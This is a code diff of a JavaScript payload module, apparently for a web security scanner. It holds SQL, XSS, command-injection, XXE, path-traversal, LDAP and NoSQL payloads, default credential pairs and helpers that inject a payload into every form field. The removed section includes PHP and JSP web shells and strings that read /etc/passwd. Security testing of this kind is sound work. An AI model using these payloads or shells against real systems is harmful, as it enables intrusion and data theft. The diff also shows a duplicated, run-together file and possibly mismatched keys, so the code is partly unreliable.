@@ -1,148 +1,4 @@
-const PAYLOADS = {
-  sql: [
-    "' OR '1'='1",
-    "' OR 1=1 --",
-    '" OR "1"="1" --',
-    "admin'--",
-    "' UNION SELECT NULL --"
-  ],
-  xss: [
-    '<script>alert(1)</script>',
-    '" onerror="alert(1)"',
-    '<img src=x onerror=alert(1)>',
-    '<svg/onload=alert(1)>',
-    'javascript:alert(1)'
-  ],
-  command: [
-    '; id',
-    '&& whoami',
-    '| uname -a',
-    '$(cat /etc/passwd)',
-    '& dir'
-  ],
-  xxe: [
-    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>',
-    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root><name>&xxe;</name></root>',
-    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root><name>&xxe;</name></root>'
-  ],
-  pathTraversal: [
-    '../../../../../etc/passwd',
-    '..\\..\\..\\..\\windows\\win.ini',
-    '../../../proc/self/environ',
-    '....//....//....//etc/passwd'
-  ],
-  ldap: [
-    '*',
-    '*)(&(objectClass=*))',
-    'admin)(|(password=*))',
-    '*)%00'
-  ],
-  nosql: [
-    '{"$ne": null}',
-    '{"$gt": ""}',
-    '{"$regex": ".*"}',
-    '{"$where": "return true"}'
-  ],
-  fileUpload: [
-    {
-      name: 'shell.php',
-      mimeType: 'application/x-php',
-      content: '<?php echo shell_exec($_GET["cmd"]); ?>'
-    },
-    {
-      name: 'webshell.jsp',
-      mimeType: 'application/octet-stream',
-      content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
-    },
-    {
-      name: 'script.svg',
-      mimeType: 'image/svg+xml',
-      content: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'
-    }
-  ],
-  auth: [
-    { username: 'admin', password: 'admin' },
-    { username: 'admin', password: 'password' },
-    { username: 'test', password: 'test123' },
-    { username: 'guest', password: 'guest' }
-  ]
-};
-
-function getPayloadTypes() {
-  return Object.keys(PAYLOADS);
-}
-
-function getPayloads(type) {
-  if (!type) {
-    return PAYLOADS;
-  }
-
-  const normalizedType = String(type).trim().toLowerCase();
-  const payloads = PAYLOADS[normalizedType];
-
-  if (!payloads) {
-    throw new Error(`Unsupported payload type: ${type}`);
-  }
-
-  return payloads;
-}
-
-function pickPayload(type, index = 0) {
-  const payloads = getPayloads(type);
-
-  if (!Array.isArray(payloads) || payloads.length === 0) {
-    throw new Error(`No payloads available for type: ${type}`);
-  }
-
-  const safeIndex = Number.isInteger(index) ? index : Number.parseInt(index, 10);
-  if (Number.isNaN(safeIndex)) {
-    return payloads[0];
-  }
-
-  return payloads[Math.max(0, Math.min(safeIndex, payloads.length - 1))];
-}
-
-function resolveInputName(input) {
-  if (typeof input === 'string' && input.trim()) {
-    return input.trim();
-  }
-
-  if (input && typeof input.name === 'string' && input.name.trim()) {
-    return input.name.trim();
-  }
-
-  return null;
-}
-
-function injectPayload(inputs, payload) {
-  if (!Array.isArray(inputs) || inputs.length === 0) {
-    throw new Error('inputs must be a non-empty array');
-  }
-
-  const body = {};
-
-  for (const input of inputs) {
-    const name = resolveInputName(input);
-    if (!name) {
-      continue;
-    }
-
-    body[name] = payload;
-  }
-
-  if (Object.keys(body).length === 0) {
-    throw new Error('No valid input names found for payload injection');
-  }
-
-  return body;
-}
-
-module.exports = {
-  getPayloadTypes,
-  getPayloads,
-  pickPayload,
-  injectPayload
-};const payloadsByType = {
+const payloadsByType = {
   sql: ["' OR 1=1 --", "' OR 'a'='a", "admin' --", "' UNION SELECT NULL --"],
   xss: [
     '<script>alert(1)</script>',
@@ -150,13 +6,7 @@ module.exports = {
     '" onmouseover="alert(1)"',
     '<svg/onload=alert(1)>'
   ],
-  command: [
-    '; whoami',
-    '&& id',
-    '| cat /etc/passwd',
-    '$(uname -a)',
-    '`whoami`'
-  ],
+  command: ['; whoami', '&& id', '| cat /etc/passwd', '$(uname -a)', '`whoami`'],
   xxe: [
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
@@ -168,13 +18,7 @@ module.exports = {
     '%2e%2e%2fetc%2fpasswd',
     '....//....//....//etc/passwd'
   ],
-  ldap: [
-    '*',
-    'admin*',
-    '*)(|(uid=*))',
-    'admin)(|(password=*))',
-    '*))%00'
-  ],
+  ldap: ['*', 'admin*', '*)(|(uid=*))', 'admin)(|(password=*))', '*))%00'],
   nosql: [
     '{"$ne": null}',
     '{"$gt": ""}',
@@ -208,16 +52,30 @@ module.exports = {
   ]
 };
 
+function normalizeType(type) {
+  return String(type || '').toLowerCase().replace(/[\s_-]/g, '');
+}
+
 function getPayloadTypes() {
-  return Object.keys(payloadsByType);
+  return ['sql', 'xss', 'command', 'xxe', 'pathTraversal', 'ldap', 'nosql', 'fileUpload', 'auth'];
 }
 
 function getPayloads(type) {
   if (!type) {
-    return payloadsByType;
+    return {
+      sql: payloadsByType.sql,
+      xss: payloadsByType.xss,
+      command: payloadsByType.command,
+      xxe: payloadsByType.xxe,
+      pathTraversal: payloadsByType.pathtraversal,
+      ldap: payloadsByType.ldap,
+      nosql: payloadsByType.nosql,
+      fileUpload: payloadsByType.fileupload,
+      auth: payloadsByType.auth
+    };
   }
 
-  const normalizedType = String(type).toLowerCase().replace(/[\s_-]/g, '');
+  const normalizedType = normalizeType(type);
   if (!payloadsByType[normalizedType]) {
     throw new Error(`Unsupported payload type: ${type}`);
   }
@@ -241,7 +99,7 @@ function pickPayload(type, index = 0) {
 
 function injectPayload(inputs, payload) {
   if (!Array.isArray(inputs) || inputs.length === 0) {
-    throw new Error('Inputs must be a non-empty array');
+    throw new Error('inputs must be a non-empty array');
   }
 
   const data = {};
